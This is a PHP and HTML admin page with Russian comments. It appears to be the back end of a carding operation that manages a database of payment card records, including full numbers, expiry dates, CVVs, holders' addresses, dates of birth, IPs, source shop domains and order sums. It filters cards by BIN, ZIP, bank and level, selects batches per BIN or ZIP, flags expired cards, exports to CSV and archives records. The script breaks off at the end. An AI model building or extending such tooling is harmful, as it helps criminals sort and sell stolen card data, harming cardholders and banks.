<?php
require 'config.php';

// Инициализация переменных для поиска
$card_number = isset($_POST['card_number']) ? $_POST['card_number'] : '';
$country = isset($_POST['country']) ? $_POST['country'] : '';
$zip = isset($_POST['zip']) ? $_POST['zip'] : '';
$city = isset($_POST['city']) ? $_POST['city'] : '';
$state = isset($_POST['state']) ? $_POST['state'] : '';
$fullNumber = isset($_POST['full_number']) ? $_POST['full_number'] : '';
$cardBrand = isset($_POST['card_brand']) ? $_POST['card_brand'] : '';
$cardType = isset($_POST['card_type']) ? $_POST['card_type'] : '';
$cardLevel = isset($_POST['card_level']) ? $_POST['card_level'] : '';
$cardBank = isset($_POST['card_bank']) ? $_POST['card_bank'] : '';
$comment = isset($_POST['comment']) ? $_POST['comment'] : '';
$domainName = isset($_POST['domain-name']) ? $_POST['domain-name'] : '';
$orderSumStart = isset($_POST['order_sum_start']) ? $_POST['order_sum_start'] : '';
$orderSumEnd = isset($_POST['order_sum_end']) ? $_POST['order_sum_end'] : '';
$expiration = isset($_POST['expiration']) ? $_POST['expiration'] : '';
$startDate = isset($_POST['start_date']) ? $_POST['start_date'] : null;
$endDate = isset($_POST['end_date']) ? $_POST['end_date'] : null;

// Создание SQL-запроса с учетом необходимых полей
$sql = "SELECT id, comments, number, expire, cvv, holder, zip, address, city, state, country, phone, email, company, dob, ipholder, domain, ccdate, bin, brand, type, bank, level FROM ccinfonext WHERE 1=1";

$params = [];

// Добавление условий для фильтрации по дате
if ($startDate && $endDate) {
    $sql .= " AND ccdate BETWEEN ? AND ?";
    $params[] = $startDate;
    $params[] = $endDate;
}

// Выполнение первого запроса для получения данных по дате
$stmt = $pdo->prepare($sql);
$stmt->execute($params);
$records = $stmt->fetchAll(PDO::FETCH_ASSOC);

// Если записей нет, то можно сразу отобразить сообщение
if (empty($records)) {
    echo "Нет записей за указанный период.";
    exit();
}

// Добавление условий для фильтрации по диапазону суммы заказа
if (!empty($orderSumStart) || !empty($orderSumEnd)) {
    $sql .= " AND (";
    
    // Проверка и подготовка начального значения
    if (!empty($orderSumStart)) {
        // Преобразование строки в целое число
        $sql .= "CAST(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(company, '$', ''), '€', ''), ' ', ''), ',', ''), '£', ''), ' EUR', ''), ' NZD', ''), ' USD', '') AS UNSIGNED) >= ?";
        $params[] = intval($orderSumStart); // Преобразовать в целое число
    }

    // Добавление условия для верхнего предела
    if (!empty($orderSumEnd)) {
        if (!empty($orderSumStart)) {
            $sql .= " AND ";
        }
        $sql .= "CAST(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(company, '$', ''), '€', ''), ' ', ''), ',', ''), '£', ''), ' EUR', ''), ' NZD', ''), ' USD', '') AS UNSIGNED) <= ?";
        $params[] = intval($orderSumEnd); // Преобразовать в целое число
    }

    $sql .= ")";
}

// Добавление условий для поиска по BIN с учётом нужного количества (например, 456462+2,545088+1)
// Проверка наличия введенных BIN
if (!empty($card_number)) {
    $card_numbers = array_map('trim', explode(',', $card_number)); 
    $likeClauses = [];
    $binCounts = []; // Массив для хранения количества для каждого BIN

    foreach ($card_numbers as $number) {
        if (strpos($number, '+') !== false) {
            list($bin, $count) = explode('+', $number);
            $bin = trim($bin);
            $count = intval(trim($count));

            // Сохраняем количество для использования позже
            if ($count > 0) {
                $binCounts[$bin] = $count;
            }
        } else {
            // Если количество не указано, устанавливаем максимальное количество
            $bin = trim($number);
            $binCounts[$bin] = PHP_INT_MAX; // Устанавливаем максимальное количество
        }

        $likeClauses[] = "bin LIKE ?";
        $params[] = "%$bin%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClauses) . ")";
}

// Добавление условий для поиска по ZIP с учётом нужного количества (например, 95065+2,33535+1)
// Проверка наличия введенных ZIP
if (!empty($zip)) {
    $zips = array_map('trim', explode(',', $zip)); 
    $likeClauses = [];
    $zipCounts = []; // Массив для хранения количества для каждого BIN

    foreach ($zips as $zipp) {
        if (strpos($zipp, '+') !== false) {
            list($zip, $count) = explode('+', $zipp);
            $zip = trim($zip);
            $count = intval(trim($count));

            // Сохраняем количество для использования позже
            if ($count > 0) {
                $zipCounts[$zip] = $count;
            }
        } else {
            // Если количество не указано, устанавливаем максимальное количество
            $zip = trim($zipp);
            $zipCounts[$zip] = PHP_INT_MAX; // Устанавливаем максимальное количество
        }

        $likeClauses[] = "zip LIKE ?";
        $params[] = "%$zip%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClauses) . ")";
}

// Добавление условий для поиска по стране, почтовому индексу, городу и штату
if (!empty($city)) {
    $cities = array_map('trim', explode(',', $city));
    $likeClausesCities = [];
    foreach ($cities as $cit) {
        $likeClausesCities[] = "city LIKE ?";
        $params[] = "%$cit%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClausesCities) . ")";
}
if (!empty($country)) {
    $countries = array_map('trim', explode(',', $country));
    $likeClausesCountries = [];
    foreach ($countries as $countr) {
        $likeClausesCountries[] = "country LIKE ?";
        $params[] = "%$countr%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClausesCountries) . ")";
}
if (!empty($state)) {
    $states = array_map('trim', explode(',', $state));
    $likeClausesStates = [];
    foreach ($states as $sta) {
        $likeClausesStates[] = "state LIKE ?";
        $params[] = "%$sta%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClausesStates) . ")";
}
if (!empty($fullNumber)) {
    $fullNumbers = array_map('trim', explode(',', $fullNumber));
    $likeClausesFullNumbers = [];
    foreach ($fullNumbers as $fullnum) {
        $likeClausesFullNumbers[] = "number LIKE ?";
        $params[] = "%$fullnum%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClausesFullNumbers) . ")";
}
if (!empty($cardBrand)) {
    $cardBrands = array_map('trim', explode(',', $cardBrand));
    $likeClausesCardBrands = [];
    foreach ($cardBrands as $cardbrand) {
        $likeClausesCardBrands[] = "brand LIKE ?";
        $params[] = "%$cardbrand%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClausesCardBrands) . ")";
}
if (!empty($cardType)) {
    $cardTypes = array_map('trim', explode(',', $cardType));
    $likeClausesCardTypes = [];
    foreach ($cardTypes as $cardtype) {
        $likeClausesCardTypes[] = "type LIKE ?";
        $params[] = "%$cardtype%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClausesCardTypes) . ")";
}
if (!empty($cardLevel)) {
    $cardLevels = array_map('trim', explode(',', $cardLevel));
    $likeClausesCardLevels = [];
    foreach ($cardLevels as $cardlevel) {
        $likeClausesCardLevels[] = "level LIKE ?";
        $params[] = "%$cardlevel%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClausesCardLevels) . ")";
}
if (!empty($cardBank)) {
    $cardBanks = array_map('trim', explode(',', $cardBank));
    $likeClausesCardBanks = [];
    foreach ($cardBanks as $cardbank) {
        $likeClausesCardBanks[] = "bank LIKE ?";
        $params[] = "%$cardbank%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClausesCardBanks) . ")";
}
if (!empty($comment)) {
    $comments = array_map('trim', explode(',', $comment));
    $likeClausesComments = [];
    foreach ($comments as $comm) {
        $likeClausesComments[] = "comments LIKE ?";
        $params[] = "%$comm%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClausesComments) . ")";
}
if (!empty($domainName)) {
    $domainNames = array_map('trim', explode(',', $domainName));
    $likeClausesDomainNames = [];
    foreach ($domainNames as $domainn) {
        $likeClausesDomainNames[] = "domain LIKE ?";
        $params[] = "%$domainn%";
    }
    $sql .= " AND (" . implode(' OR ', $likeClausesDomainNames) . ")";
}

// Проверка и преобразование значения expiration
if (!empty($expiration)) {
    // Разделяем строку на месяц и год
    list($month, $year) = explode('/', $expiration);
    
    // Увеличиваем год на 2000, чтобы получить полный год и берем только последние две цифры
    $year = intval($year) % 100;

    // Форматируем месяц и год в строку MM/YY
    $expirationDate = sprintf('%02d/%02d', $month, $year); // % 100 для получения только двух последних цифр

    // Добавляем условие к SQL-запросу с учетом нового формата
    $sql .= " AND CONCAT(SUBSTRING(expire, 4, 2), SUBSTRING(expire, 1, 2)) <= CONCAT(?, ?)";
    $params[] = $year;  // Две последние цифры года
    $params[] = $month; // Месяц
}

//Выборка просроченных и истекающих карт по полю expire
if (isset($_POST['fetch_records'])) {
	$sql .= "
		AND CONCAT(SUBSTRING(expire, 4, 2), SUBSTRING(expire, 1, 2)) <= CONCAT(RIGHT(YEAR(CURRENT_DATE), 2), LPAD(MONTH(CURRENT_DATE), 2, '0'))
	";
}
//End Выборка просроченных и истекающих карт по полю expire

// Выполнение окончательного запроса
$stmt = $pdo->prepare($sql);
$stmt->execute($params);
$records = $stmt->fetchAll(PDO::FETCH_ASSOC);


// Фильтрация по количеству на уровне PHP (это для вывода, если указано количество записей с нужными бинами)
$filteredRecords = [];
if (!empty($binCounts)) {
    foreach ($binCounts as $bin => $count) {
        $recordCount = 0;
        foreach ($records as $record) {
            if (isset($record['bin']) && strpos(strval($record['bin']), strval($bin)) !== false) {
                $filteredRecords[] = $record;
                $recordCount++;
                if ($recordCount >= $count) {
                    break; // Достигли нужного количества записей для этого BIN
                }
            }
        }
    }
} else {
    // Если нет введенных BIN, просто берем все записи
    $filteredRecords = $records;
}

// Подсчет статистики по BIN
$binStats = [];
foreach ($records as $row) {
    $bin = $row['bin'];
    if (!isset($binStats[$bin])) {
        $binStats[$bin] = 0;
    }
    $binStats[$bin]++;
}

// Определяем все интересующие BIN (без количества)
$allBins = array_map(function($bin) {
    return trim(explode('+', $bin)[0]); // Извлекаем только BIN
}, explode(',', $card_number));
$totalBins = 0;

// Подготовка для отображения
$output = [];
foreach ($allBins as $bin) {
    $count = isset($binStats[$bin]) ? $binStats[$bin] : '-';
    $output[] = ['bin' => $bin, 'count' => $count];
    if ($count !== '-') {
        $totalBins += $count;
    }
}

// Добавляем найденные записи
foreach ($binStats as $bin => $count) {
    if (!in_array($bin, $allBins)) {
        $output[] = ['bin' => $bin, 'count' => $count];
        $totalBins += $count;
    }
}

// Сортировка массива: сначала заполненные, затем пустые
usort($output, function($a, $b) {
    return ($a['count'] === '-') ? 1 : -1; // Сначала ненайденные, затем найденные
});


/****Вторая таблица статистики по бинам****/
// Подсчет статистики по отобранным BIN
$filteredBinStats = [];
foreach ($filteredRecords as $row) {
    $bin = $row['bin'];
    if (!isset($filteredBinStats[$bin])) {
        $filteredBinStats[$bin] = 0;
    }
    $filteredBinStats[$bin]++;
}

// Определяем все интересующие BIN (без количества)
$allBins = array_map(function($bin) {
    return trim(explode('+', $bin)[0]); // Извлекаем только BIN
}, explode(',', $card_number));
$totalFilteredBins = 0;

// Подготовка для отображения
$filteredOutput = [];
foreach ($allBins as $bin) {
    $count = isset($filteredBinStats[$bin]) ? $filteredBinStats[$bin] : '-';
    $filteredOutput[] = ['bin' => $bin, 'count' => $count];
    if ($count !== '-') {
        $totalFilteredBins += $count;
    }
}

// Добавляем найденные записи
foreach ($filteredBinStats as $bin => $count) {
    if (!in_array($bin, $allBins)) {
        $filteredOutput[] = ['bin' => $bin, 'count' => $count];
        $totalFilteredBins += $count;
    }
}

// Сортировка массива: сначала заполненные, затем пустые
usort($filteredOutput, function($a, $b) {
    return ($a['count'] === '-') ? 1 : -1; // Сначала ненайденные, затем найденные
});

// Фильтрация по количеству на уровне PHP (это для вывода, если указано количество записей с нужными зипами)
$filteredRecords = [];
if (!empty($zipCounts)) {
    foreach ($zipCounts as $zip => $count) {
        $recordCount = 0;
        foreach ($records as $record) {
            if (isset($record['zip']) && strpos(strval($record['zip']), strval($zip)) !== false) {
                $filteredRecords[] = $record;
                $recordCount++;
                if ($recordCount >= $count) {
                    break; // Достигли нужного количества записей для этого ZIP
                }
            }
        }
    }
} else {
    // Если нет введенных ZIP, просто берем все записи
    $filteredRecords = $records;
}

// Подсчет статистики по ZIP
$zipStats = [];
foreach ($records as $row) {
    $zip = $row['zip'];
    if (!isset($zipStats[$zip])) {
        $zipStats[$zip] = 0;
    }
    $zipStats[$zip]++;
}

// Определяем все интересующие ZIP (без количества)
$allZips = array_map(function($zip) {
    return trim(explode('+', $zip)[0]); // Извлекаем только ZIP
}, explode(',', $zip));
$totalZips = 0;

// Подготовка для отображения
$outputZip = [];
foreach ($allZips as $zip) {
    $countZip = isset($zipStats[$zip]) ? $zipStats[$zip] : '-';
    $outputZip[] = ['zip' => $zip, 'count' => $countZip];
    if ($countZip !== '-') {
        $totalZips += $countZip;
    }
}

// Добавляем найденные записи
foreach ($zipStats as $zip => $countZip) {
    if (!in_array($zip, $allZips)) {
        $outputZip[] = ['zip' => $zip, 'count' => $countZip];
        $totalZips += $countZip;
    }
}

// Сортировка массива: сначала заполненные, затем пустые
usort($outputZip, function($az, $bz) {
    return ($az['count'] === '-') ? 1 : -1; // Сначала ненайденные, затем найденные
});


/****Вторая таблица статистики по бинам****/
// Подсчет статистики по отобранным ZIP
$filteredZipStats = [];
foreach ($filteredRecords as $row) {
    $zip = $row['zip'];
    if (!isset($filteredZipStats[$zip])) {
        $filteredZipStats[$zip] = 0;
    }
    $filteredZipStats[$zip]++;
}

// Определяем все интересующие ZIP (без количества)
$allZips = array_map(function($zip) {
    return trim(explode('+', $zip)[0]); // Извлекаем только ZIP
}, explode(',', $zip));
$totalFilteredZips = 0;

// Подготовка для отображения
$filteredOutputZip = [];
foreach ($allZips as $zip) {
    $countZip = isset($filteredZipStats[$zip]) ? $filteredZipStats[$zip] : '-';
    $filteredOutputZip[] = ['zip' => $zip, 'count' => $countZip];
    if ($countZip !== '-') {
        $totalFilteredZips += $countZip;
    }
}

// Добавляем найденные записи
foreach ($filteredZipStats as $zip => $countZip) {
    if (!in_array($zip, $allZips)) {
        $filteredOutputZip[] = ['zip' => $zip, 'count' => $countZip];
        $totalFilteredZips += $countZip;
    }
}

// Сортировка массива: сначала заполненные, затем пустые
usort($filteredOutputZip, function($az, $bz) {
    return ($az['count'] === '-') ? 1 : -1; // Сначала ненайденные, затем найденные
});
?>

<!DOCTYPE html>
<html>
<head>
    <title>Результаты выборки</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
	<link id="theme-stylesheet" rel="stylesheet" href="assets/css/main-dark.css">
	<script src="assets/js/theme-switcher.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>
	<a href="index.php"><button id="back-to-home" class="btn btn-secondary" style="margin: 10px">На главную</button></a>
	<br>    
		
		<form method="POST" action="export.php">
			<input type="hidden" name="data" value="<?php echo htmlspecialchars(serialize($records)); ?>">
			<button type="submit" class="btn btn-success" style="margin: 10px; width: 238.52px;">Экспортировать в CSV</button>
		</form>
		
		<div style="display: flex; flex-direction: row; justify-content: space-between;">
			<div style="display: flex; flex-direction: column;">
				<button id="move_to_archive" class="btn btn-danger" style="margin: 10px">Удалить и перенести в архив</button>
				
				<button id="show-archive" class="btn btn-info" style="margin: 10px; width: 238.52px;">Показать архив</button>
				<br>
				<button id="select-first-per-bin" class="btn btn-primary" style="margin: 10px;">Отобрать по одному БИНу</button>
				
				<button id="select-ten-records" class="btn btn-primary" style="margin: 10px;">Отобрать по 10 записей</button>
				
				<button id="copyButton" class="btn btn-secondary">Копировать отмеченные данные</button>
				
				<button id="final-delete-selected" class="btn btn-danger" style="margin: 10px">Удалить безвозвратно</button>
				
				
			</div>
			
			<!--<div style="width: 100%; border: 2px solid #dee2e6; padding:5px; margin:5px;">
			<h5>Статистика по BIN</h5>
			<p>
				<?php //if (!empty($binStats)): ?>
					<?php /*
						$output = []; // Массив для хранения строк вывода
						$totalBins = 0; // Переменная для общего количества карт
						foreach ($binStats as $bin => $count) {
							$output[] = '"' . htmlspecialchars($bin) . '"' . ': ' . '<b>' . $count . '</b>'; // Формируем строку BIN:Количество
							$totalBins += $count; // Суммируем количество карт
						}
						echo implode('; ', $output); // Объединяем все элементы массива через "; "
						echo '<br>';
						echo '-----------';
						echo '<br>';
						echo 'Всего карт: ' . $totalBins; // Вывод общего количества карт
					*/?>
				<?php //else: ?>
					<span>Нет данных для отображения.</span>
				<?php //endif; ?>
			</p>-->
			<div style="display: flex; flex-direction: row; justify-content: space-between;">
				<div style="width: 220px; float: right; border: 2px solid #dee2e6; padding: 5px; margin: 5px; max-height: 250px !important; overflow-y: auto; overflow-x: hidden;" id="binTable">
					<h5>Статистика по BIN</h5>
					<table class="table" id="binStatsTable">
						<thead>
							<tr>
								<th>BIN</th>
								<th>Количество</th>
							</tr>
						</thead>
						<tbody style="text-align: center;">
							<?php if (!empty($output)): ?>
								<?php foreach ($output as $row): ?>
									<tr>
										<td><?php echo htmlspecialchars($row['bin']); ?></td>
										<td><?php echo $row['count']; ?></td>
									</tr>
								<?php endforeach; ?>
								<tr>
									<td><?php echo "Всего карт: "; ?></td>
									<td><?php echo $totalBins; ?></td>
								</tr>
							<?php else: ?>
								<tr>
									<td colspan="2" class="text-center">Нет данных для отображения.</td>
								</tr>
							<?php endif; ?>
						</tbody>
					</table>
				</div>
				
				<div style="width: 220px; float: right; border: 2px solid #dee2e6; padding: 5px; margin: 5px; max-height: 250px !important; overflow-y: auto; overflow-x: hidden;" id="filteredBinTable">
					<h5>Отобранные BIN</h5>
					<table class="table" id="filteredBinStatsTable">
						<thead>
							<tr>
								<th>BIN</th>
								<th>Количество</th>
							</tr>
						</thead>
						<tbody style="text-align: center;">
							<?php if (!empty($filteredOutput)): ?>
								<?php foreach ($filteredOutput as $row): ?>
									<tr>
										<td><?php echo htmlspecialchars($row['bin']); ?></td>
										<td><?php echo $row['count']; ?></td>
									</tr>
								<?php endforeach; ?>
								<tr>
									<td><?php echo "Всего карт: "; ?></td>
									<td><?php echo $totalFilteredBins; ?></td>
								</tr>
							<?php else: ?>
								<tr>
									<td colspan="2" class="text-center">Нет данных для отображения.</td>
								</tr>
							<?php endif; ?>
						</tbody>
					</table>
				</div>
			</div>
		<!--</div>-->
		
			<div style="display: flex; flex-direction: row; justify-content: space-between;">
				<div style="width: 220px; float: right; border: 2px solid #dee2e6; padding: 5px; margin: 5px; max-height: 250px !important; overflow-y: auto; overflow-x: hidden;" id="binTable">
					<h5>Статистика по ZIP</h5>
					<table class="table" id="zipStatsTable">
						<thead>
							<tr>
								<th>ZIP</th>
								<th>Количество</th>
							</tr>
						</thead>
						<tbody style="text-align: center;">
							<?php if (!empty($outputZip)): ?>
								<?php foreach ($outputZip as $row): ?>
									<tr>
										<td><?php echo htmlspecialchars($row['zip']); ?></td>
										<td><?php echo $row['count']; ?></td>
									</tr>
								<?php endforeach; ?>
								<tr>
									<td><?php echo "Всего карт: "; ?></td>
									<td><?php echo $totalZips; ?></td>
								</tr>
							<?php else: ?>
								<tr>
									<td colspan="2" class="text-center">Нет данных для отображения.</td>
								</tr>
							<?php endif; ?>
						</tbody>
					</table>
				</div>
				
				<div style="width: 220px; float: right; border: 2px solid #dee2e6; padding: 5px; margin: 5px; max-height: 250px !important; overflow-y: auto; overflow-x: hidden;" id="filteredBinTable">
					<h5>Отобранные ZIP</h5>
					<table class="table" id="filteredZipStatsTable">
						<thead>
							<tr>
								<th>ZIP</th>
								<th>Количество</th>
							</tr>
						</thead>
						<tbody style="text-align: center;">
							<?php if (!empty($filteredOutputZip)): ?>
								<?php foreach ($filteredOutputZip as $row): ?>
									<tr>
										<td><?php echo htmlspecialchars($row['zip']); ?></td>
										<td><?php echo $row['count']; ?></td>
									</tr>
								<?php endforeach; ?>
								<tr>
									<td><?php echo "Всего карт: "; ?></td>
									<td><?php echo $totalFilteredZips; ?></td>
								</tr>
							<?php else: ?>
								<tr>
									<td colspan="2" class="text-center">Нет данных для отображения.</td>
								</tr>
							<?php endif; ?>
						</tbody>
					</table>
				</div>
			</div>
			
		</div>
		
		<!-- Пагинация (не работает на отфильтрованных. Только на всей таблице)
		<div id="navigation-wrapper">
			<form method="GET" action="">
				<label for="limit">Записей на странице:</label>
				<select name="limit" id="limit" onchange="this.form.submit()">
					<option value="10" <?php if ($limit == 10) echo 'selected'; ?>>10</option>
					<option value="20" <?php if ($limit == 20) echo 'selected'; ?>>20</option>
					<option value="30" <?php if ($limit == 30) echo 'selected'; ?>>30</option>
					<option value="40" <?php if ($limit == 40) echo 'selected'; ?>>40</option>
					<option value="50" <?php if ($limit == 50) echo 'selected'; ?>>50</option>
				</select>
				<input type="hidden" name="page" value="<?php echo $page; ?>">
			</form>
			
			<nav aria-label="Page navigation">
				<ul class="pagination">
					<li class="page-item <?php if ($currentPage == 1) echo 'disabled'; ?>">
						<a class="page-link" href="?page=1&limit=<?php echo $limit; ?>" aria-label="First">
							<span aria-hidden="true">&laquo;&laquo;</span>
						</a>
					</li>
					<li class="page-item <?php if ($currentPage == 1) echo 'disabled'; ?>">
						<a class="page-link" href="?page=<?php echo max(1, $currentPage - 1); ?>&limit=<?php echo $limit; ?>" aria-label="Previous">
							<span aria-hidden="true">&laquo;</span>
						</a>
					</li>

					<?php foreach ($pagination as $page): ?>
						<?php if ($page === '...'): ?>
							<li class="page-item disabled"><span class="page-link">...</span></li>
						<?php else: ?>
							<li class="page-item <?php if ($page == $currentPage) echo 'active'; ?>">
								<a class="page-link" href="?page=<?php echo $page; ?>&limit=<?php echo $limit; ?>"><?php echo $page; ?></a>
							</li>
						<?php endif; ?>
					<?php endforeach; ?>

					<li class="page-item <?php if ($currentPage == $totalPages) echo 'disabled'; ?>">
						<a class="page-link" href="?page=<?php echo min($totalPages, $currentPage + 1); ?>&limit=<?php echo $limit; ?>" aria-label="Next">
							<span aria-hidden="true">&raquo;</span>
						</a>
					</li>
					<li class="page-item <?php if ($currentPage == $totalPages) echo 'disabled'; ?>">
						<a class="page-link" href="?page=<?php echo $totalPages; ?>&limit=<?php echo $limit; ?>" aria-label="Last">
							<span aria-hidden="true">&raquo;&raquo;</span>
						</a>
					</li>
				</ul>
			</nav>
		</div>
		-->
		<table class="table">
			<thead>
				<tr>
					<th>Delete</th>
					<th style="text-align: center;vertical-align: middle;">
						<input type="checkbox" id="select-all" style="width: 19px; height: 19px; margin: 0 auto;">
					</th>
					<th>ID</th>
					<th>Comments</th>
					<th>Info</th>
					<th>Number</th>
					<th>Expire</th>
					<th>CVV</th>
					<th>Holder</th>
					<th>ZIP</th>
					<th>Address</th>
					<th>City</th>
					<th>State</th>
					<th>Country</th>
					<th>Phone</th>
					<th>Email</th>
					<th>Sum</th>
					<th>DOB</th>
					<th>Ipholder</th>
					<th>BIN</th>
					<th>Date</th>
					<th>Domain</th>
				</tr>
			</thead>
			<tbody>
				<?php if (!empty($filteredRecords)): ?>
					<?php foreach ($filteredRecords as $row): ?>
						<tr>
							<td>
								<div class="d-flex">
									<input type="checkbox" class="record-delete-checkbox" style="width: 29px;height: 29px;border: 1px solid #dc3545 !important;" value="<?php echo $row['id']; ?>">
								</div>						
							</td>
							<td><input type="checkbox" class="record-checkbox" style="width: 29px; height: 29px" value="<?php echo $row['id']; ?>"></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="id"><?php echo $row['id']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="comments"><?php echo $row['comments']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="info">
								<u>Brand:</u> <?php echo htmlspecialchars($row['brand'] !== null ? $row['brand'] : 'Не указано'); ?><br>
								<u>Type:</u> <?php echo htmlspecialchars($row['type'] !== null ? $row['type'] : 'Не указано'); ?><br>
								<u>Level:</u> <?php echo htmlspecialchars($row['level'] !== null ? $row['level'] : 'Не указано'); ?><br>
								<u>Bank:</u> <?php echo htmlspecialchars($row['bank'] !== null ? $row['bank'] : 'Не указано'); ?><br>
							</td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="number" data-num="<?php echo htmlspecialchars($row['number']); ?>"><?php echo $row['number']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="expire"><?php echo $row['expire']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="cvv"><?php echo $row['cvv']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="holder"><?php echo $row['holder']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="zip"><?php echo $row['zip']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="address"><?php echo $row['address']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="city"><?php echo $row['city']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="state"><?php echo $row['state']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="country"><?php echo $row['country']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="phone"><?php echo $row['phone']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="email"><?php echo $row['email']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="company"><?php echo $row['company']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="dob"><?php echo $row['dob']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="ipholder"><?php echo $row['ipholder']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="bin" data-bin="<?php echo $row['bin']; ?>"><?php echo $row['bin']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="ccdate"><?php echo $row['ccdate']; ?></td>
							<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="domain"><?php echo $row['domain']; ?></td>
						</tr>
					<?php endforeach; ?>
				<?php else: ?>
					<tr>
						<td colspan="20" class="text-center">Нет записей за указанный период.</td>
					</tr>
				<?php endif; ?>
			</tbody>
		</table>
    </div>
</body>
</html>

<script>
//Выбор всех чекбоксов
$('#select-all').on('change', function() {
	const isChecked = $(this).is(':checked');
	$('.record-checkbox').prop('checked', isChecked);
	updateButton();
});

//Удаление с перемещением в архив
$(document).ready(function() {
	$('#move_to_archive').on('click', function() {
		const ids = [];                
		$('.record-checkbox:checked').each(function() {
			ids.push($(this).closest('tr').find('.record-checkbox').val());
		});
/*
		if (ids.length > 0) {
			//if (confirm("Вы уверены, что хотите перенести записи в архив?")) {
				$.ajax({
					url: 'delete_multiple.php',
					type: 'POST',
					data: { ids: ids },
					dataType: 'json', // Указываем, что ожидаем JSON
					success: function(response) {
						if (response.success) {
							location.reload(); // Перезагрузить страницу для обновления данных
						} else {
							alert(response.message); // Выводим сообщение об ошибке
						}
					}
				});
			//}
		} else {
			alert("Пожалуйста, выберите хотя бы одну запись.");
		}
		*/
		
		if (ids.length > 0) {
            $.ajax({
                url: 'delete_multiple.php',
                type: 'POST',
                data: { ids: ids },
                dataType: 'json',
                success: function(response) {
                    console.log("Response received:", response); // Отладка
                    if (response.success) {
						alert(response.message);
                        console.log("Success case executed."); // Отладка
                        location.reload(); // Перезагрузить страницу для обновления данных
                    } else {
						alert(response.message);
                        //console.log("Alerting message:", response.message); // Отладка
                        //alert("Error: " + response.message); // Выводим сообщение об ошибке
						location.reload();
                    }
                },
                error: function(jqXHR, textStatus, errorThrown) {
                    alert("Ошибка: " + textStatus + " " + errorThrown);
                }
            });
        } else {
            alert("Пожалуйста, выберите хотя бы одну запись.");
        }
		
		
	});
});

//Полное удаление без перемещения в архив
$(document).ready(function() {
	const checkoxesDelete = document.querySelectorAll('.record-delete-checkbox');
    const finalDeleteButton = document.getElementById('final-delete-selected');

    function updateDeleteButton() {
        const checkedDeleteCount = Array.from(checkoxesDelete).filter(cb => cb.checked).length;
        if (checkedDeleteCount > 0) {
            finalDeleteButton.style.display = 'block';
            finalDeleteButton.textContent = `Удалить полностью ${checkedDeleteCount} записей`;
        } else {
            finalDeleteButton.style.display = 'none';
        }
    }

    checkoxesDelete.forEach(checkbox => {
        checkbox.addEventListener('change', updateDeleteButton);
    });
	
	$('#final-delete-selected').on('click', function() {
        const ids = [];
        $('.record-delete-checkbox:checked').each(function() {
            ids.push($(this).val());
        });

        if (ids.length > 0) {
			console.log(ids);
			const checkedDeleteCount = Array.from(checkoxesDelete).filter(cb => cb.checked).length;
            if (confirm(`Удалить ${checkedDeleteCount} выбранных записей безвозвратно?`)) {
                $.ajax({
                    url: 'delete_multiple_final.php',
                    type: 'POST',
                    data: { ids: ids },
                    success: function(response) {
						//console.log(response);
                        location.reload(); // Перезагрузить страницу для обновления данных
                    }
                });
            }
        } else {
            alert("Пожалуйста, выберите хотя бы одну запись.");
        }
    });
});



function makeEditable(element) {
	element.contentEditable = true;
	element.focus();
}

	$(document).ready(function() {
		// update field value when Enter key is pressed
		$(document).on('keypress', '.edit', function(event) {
			if (event.keyCode === 13) { // 13 is the code for the Enter key
				event.preventDefault();
				var id = $(this).attr('data-id');
				var field = $(this).attr('data-field');
				var value = $(this).text();
				$.ajax({
					url: 'update.php',
					type: 'POST',
					data: { id: id, field: field, value: value },
					success: function() {
						location.reload(); // reload the page to see the updated data
					}
				});
			}
		});
		/*	
		// create new record when Create button is clicked
		$(document).on('click', '.create', function() {
			$.ajax({
				url: 'create.php',
				type: 'POST',
				data: { name: '', number: '' },
				success: function() {
